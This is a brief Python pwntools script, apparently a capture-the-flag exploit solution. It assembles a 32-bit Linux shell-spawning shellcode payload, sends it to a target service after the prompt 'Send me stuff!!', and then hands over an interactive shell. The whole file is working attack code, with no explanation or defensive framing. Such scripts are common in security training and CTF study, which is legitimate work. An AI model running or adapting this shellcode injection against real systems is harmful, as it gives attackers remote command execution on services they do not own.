from parse_args_and_some_func import *

sh = all_parsed_args['io']
context.update(arch='i386', os='linux', endian='little')
payload = shellcraft.sh()

sh.sendafter("Send me stuff!!\n", asm(payload))

sh.interactive()
    